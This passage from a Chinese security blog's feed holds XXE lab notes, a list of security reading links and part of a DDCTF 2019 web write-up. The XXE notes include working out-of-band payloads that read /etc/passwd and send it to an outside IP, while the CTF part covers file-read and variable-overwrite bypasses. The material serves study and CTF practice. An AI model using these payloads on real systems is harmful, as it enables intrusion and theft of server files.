class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>结果如下</strong></p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190819/b3jxkk5ssclx.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>第二种：将读取数据放在<code>CDATA</code>中输出进行绕过</li></ul><p><strong>payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">roottag</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">start</span> <span class="meta-string">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///2.txt&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">end</span> <span class="meta-string">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://107.182.30.95/evil.dtd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%dtd; ]&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">roottag</span>&gt;</span><span class="symbol">&amp;all;</span><span class="tag">&lt;/<span class="name">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>服务器上放置evil.dtd</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>结果如下</strong></p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190820/L2e2FpJf6h34.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><blockquote><p>注意：读取文件时候要注意<code>文件</code>以及<code>文件夹</code>权限问题，否则会读取失败，记录下遇到的这个坑吧，在这浪费了不少时间，烧脑~</p></blockquote><h5 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a>实验二：无回显读取本地敏感文件(Blind OOB XXE)</h5><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>test.dtd</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此处需要<strong>注意</strong>，因为实体值中不能有<code>%</code>，故需要将<code>%</code>转成<code>&amp;#37;</code>或者<code>&amp;#x25;</code>，即正确写法如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://107.182.30.95:9999/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://107.182.30.95/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>在服务器监听端口，发送payload结果如下：</p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190819/vIveUNB3EuEj.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><p><img src="http://qiniuyun.zzqsmile.top/blog/20190819/Piw5BFaUg7NS.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><hr><p>以上就是XXE基本利用方式总结笔记，当然XXE的危害还有很多，由于时间原因，暂不记录。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a href="https://xz.aliyun.com/t/3357">1</a></p><p><a href="http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93">2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;好记性不如烂笔头，关于XXE还是要记录下自己的学习过程，以后看起来会更清楚，详细原理不再多讲，简单做个实验记录下笔记以便使用。&lt;/p&gt;</summary>
    
    
    
    <category term="web安全" scheme="http://zzqsmile.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="XXE" scheme="http://zzqsmile.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>优秀文章汇总</title>
    <link href="http://zzqsmile.github.io/2019/06/06/web%E5%AE%89%E5%85%A8/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%B1%87%E6%80%BB/"/>
    <id>http://zzqsmile.github.io/2019/06/06/web%E5%AE%89%E5%85%A8/%E4%BC%98%E7%A7%80%E6%96%87%E7%AB%A0%E6%B1%87%E6%80%BB/</id>
    <published>2019-06-06T01:00:00.000Z</published>
    <updated>2019-09-05T05:58:16.000Z</updated>
    
    <content type="html"><![CDATA[<p>优秀文章传送门</p><a id="more"></a><h6 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h6><ul><li><p><a href="https://security.yirendai.com/news/share/26">浅谈XSS—字符编码和浏览器解析原理</a></p></li><li><p><a href="https://blog.csdn.net/qq_33020901/article/details/87875104">XSS Bypass List</a></p></li></ul><h6 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h6><ul><li><a href="https://www.anquanke.com/post/id/158674">between注入</a></li><li><a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">Sql注入笔记</a></li></ul><h6 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h6><ul><li><a href="https://www.secpulse.com/archives/3750.html">解析漏洞总结</a></li><li><a href="https://www.cnblogs.com/shellr00t/p/6426856.html">典型漏洞归纳之解析漏洞</a></li><li><a href="https://www.cnblogs.com/shellr00t/p/6426945.html">典型漏洞归纳之上传漏洞</a></li></ul><h6 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h6><h6 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h6><h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><h6 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h6><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><h6 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h6><ul><li><a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></li></ul><h6 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h6><ul><li><p><a href="https://www.secpulse.com/archives/55286.html">常见Web源码泄露总结</a></p></li><li><p><a href="https://www.freebuf.com/articles/web/149761.html">Nginx不安全配置可能导致的安全漏洞</a></p></li></ul><h6 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h6><ul><li><a href="https://www.secpulse.com/archives/61101.html">未授权访问漏洞总结</a></li></ul><h6 id="综合经验篇"><a href="#综合经验篇" class="headerlink" title="综合经验篇"></a>综合经验篇</h6><ul><li><p><a href="https://xz.aliyun.com/t/6194?spm=5176.12901015.0.i12901015.11f1525cQKCN4b&accounttraceid=32dd5dec-db8a-48f2-9de8-accf4febe558">以购物流程挖掘商城漏洞</a></p></li><li><p><a href="https://www.freebuf.com/vuls/211842.html">全程带阻：记一次授权网络攻防演练（上）</a></p></li><li><p><a href="https://www.freebuf.com/vuls/211847.html">全程带阻：记一次授权网络攻防演练（下）</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;优秀文章传送门&lt;/p&gt;</summary>
    
    
    
    <category term="收藏文章" scheme="http://zzqsmile.github.io/categories/%E6%94%B6%E8%97%8F%E6%96%87%E7%AB%A0/"/>
    
    
    <category term="传送门" scheme="http://zzqsmile.github.io/tags/%E4%BC%A0%E9%80%81%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019部分web题Write Up</title>
    <link href="http://zzqsmile.github.io/2019/04/18/CTF/DDCTF_2019_%E9%83%A8%E5%88%86WEB%E9%A2%98%E8%A7%A3/"/>
    <id>http://zzqsmile.github.io/2019/04/18/CTF/DDCTF_2019_%E9%83%A8%E5%88%86WEB%E9%A2%98%E8%A7%A3/</id>
    <published>2019-04-18T08:00:00.000Z</published>
    <updated>2019-04-18T12:05:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文主要记录<code>DDCTF2019</code>中部分web赛题的解题过程，仅学习参考使用。</p></blockquote><a id="more"></a><p><strong>声明：语言表达能力有限，本问仅供学习参考，大佬勿喷！</strong></p><h5 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h5><ul><li><p>题目地址<br>  <a href="http://117.51.150.246/">http://117.51.150.246</a></p></li><li><p>解题过程</p></li></ul><p>1).首先打开题目，url为<code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code>，图中出现两个flag.jpg，和一个心情复杂的表情包。看一下源码，发现应该是将文件内容进行base64编码，然后当作图片的内容输出。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-36e45b022ca4345d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-e529f54bd750db4d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>2).第一反应是文件包含，jpg参数看不懂。<code>TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code>，解码看看，通过先进行两次base64解码，再对解码解码进行16进制解码，发现结果为<code>flag.jpg</code>。由此可以知道，文件名需要先进行16进制编码，再进行两次base64编码。</p><p>3).尝试读取<code>/etc/passwd</code>，但是好像不能够目录跳转，过滤了<code>/</code>。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-b4808cc88f67705f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>4).试一试读取index.php内容，初步猜想，读取源码，进行代码审计。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-c080e30ea6a2b34a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-8852a9bdd4e24bf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>5).将base64部分解码，得到index.php源码如下。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-1185f76c3c6f83a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">&#x27;jpg&#x27;</span>]))</span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;jpg&#x27;</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;title&gt;&#x27;</span>.$_GET[<span class="string">&#x27;jpg&#x27;</span>].<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;</span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">$file = str_replace(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;!&quot;</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.$txt.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>6).看来思路没错，接下来看文件代码，发现代码是一些基本的功能输出，并没有解题的线索，唯一吸引注意的是注释部分，发现了一个博客地址。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-5c27767df59ce7a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>打开博客，再别人提示下注意到这篇文章，看到这我不得不吐槽一句，出题人脑子有坑吧，线索在博客中就不说了，你倒是直接链接到这篇文章也行啊，坑爹！接下来看看这篇文章，其实没啥看的，就是linux下文件意外退出，会留下一个.swp交换文件。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-a87dd039f83406d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>7).那就是文章中说的这个<code>practice.txt.swp</code>隐藏文件吧。于是继续读取文件源码吧，还是将<code>practice.txt.swp</code>文件通过<code>hex()——&gt;base64()——&gt;base64()</code>顺序编码，然后读取内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-226bb7b2325d7b2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-bf34853077c24a11.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-bd8c28b28f2dc2c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>看到了<code>practice.txt.swp</code>里面内容为<code>f1ag!ddctf.php</code>，到这个地方明显离成功不远了，应该就是继续读取<code>f1ag!ddctf.php</code>文件内容了。</p></blockquote><p>8). 之前在读取index.php文件时候，注意以下代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">$file = str_replace(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;!&quot;</span>, $file);</span><br><span class="line"><span class="keyword">echo</span> $file.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>很明显意思就是文件名在<code>a-zA-Z0-9.</code>中，不能有<code>!</code>，但是下面一行代码是将<code>config</code>字符串替换为<code>!</code>，分析完其实很简单了，要将<code>f1ag!ddctf.php</code>名变成<code>f1agconfigddctf.php</code>就行了。</p></blockquote><p>9).读取<code>f1ag!ddctf.php</code>内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-a95281ea359b69f9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-4c57a21657cd6175.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-899a0547610a254d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">$k = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    <span class="keyword">if</span>($uid==$content)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>10). 审计<code>f1ag!ddctf.php</code>，发现这个出题人可能脑子短路了吧，在这先说结论，php代码中<code>$content=&#39;&#39;</code>，因此我们只需要传入<code>uid=</code>即可拿到<code>flag</code>，因为题目本身就不存在名为<code>hello</code>的文件，或者就是<code>hello</code>文件里面为空，所以<code>file_get_contents($k)</code>的值返回<code>false</code>，然后再经过<code>trim()</code>函数，<code>false</code>被转换成空字符串<code>&quot;&quot;</code>，因此，传入<code>uid</code>等于空即可绕过判断得到flag。注意此处绝对不能想错了误以为file_get_contents($k)会将返回值复制给变量。因此说出题人本来是想考察<code>extract()</code>变量覆盖的，结果弄巧成拙,代码中即使<code>==</code>换成<code>===仍然成立</code>，这样看来这道题最后还变简单了。</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-5986ec81f4d91fd9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>假如我将<code>$k</code>值覆盖掉为一个存在的文件名<code>config.php</code>，如下：</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-842da6bea4987dc5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>看到此处相信都明白我所说的意思了吧，如有疑惑建议亲自动手实践解惑!</strong></p><hr><h5 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h5><ul><li><p>题目地址</p><p>  <a href="http://117.51.158.44/index.php">http://117.51.158.44/index.php</a></p></li><li><p>解题过程</p><p>  1.首先打开题目，如下图所示：抱歉，您没有登陆权限，请获取权限后访问    —–</p><p>  <img src="https://upload-images.jianshu.io/upload_images/8166147-630d8fbe81b1e38b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  2.很明显首先要绕过认证才能访问，通过源码信息查看，发现了一个<code>ajax请求</code>，如下所示：</p><p>  <img src="https://upload-images.jianshu.io/upload_images/8166147-320d8172e04bae71.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  3.发现<code>didictf_username</code>字段可能是一个认证字段，于是走流程抓包发现<code>didictf_username</code>字段，但是不知道名字啊，这个时候就要根据经验了，试试<code>admin</code>吧，果不其然，通过验证，如下所示：</p><p>  <img src="https://upload-images.jianshu.io/upload_images/8166147-eeb56cafad1dc544.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  4.通过验证之后显示结果为：您当前当前权限为管理员—-请访问:<code>app/fL2XID2i0Cdh.php</code></p><p>  <img src="https://upload-images.jianshu.io/upload_images/8166147-aa661163884cb753.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>  5.下面接着访问<code>app/fL2XID2i0Cdh.php</code>，发现了是两个php文件源码，这就很明显了，接下来就是代码审计，绕过流程，输出flag了。</p><p>  <strong>url:app/Application.php</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span>(<span class="params">$data, $errMsg = <span class="string">&#x27;success&#x27;</span></span>) </span>&#123;</span><br><span class="line">        $ret = [<span class="string">&#x27;errMsg&#x27;</span> =&gt; $errMsg,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> $ret;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>]) &amp;&amp; $_SERVER[<span class="string">&#x27;HTTP_DIDICTF_USERNAME&#x27;</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">&#x27;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">&#x27;抱歉，您没有登陆权限，请获取权限后访问-----&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span>(<span class="params">$path</span>) </span>&#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$path);</span><br><span class="line">    $path=str_replace(<span class="string">&#x27;..\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$path);</span><br><span class="line">    <span class="keyword">return</span> $path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span 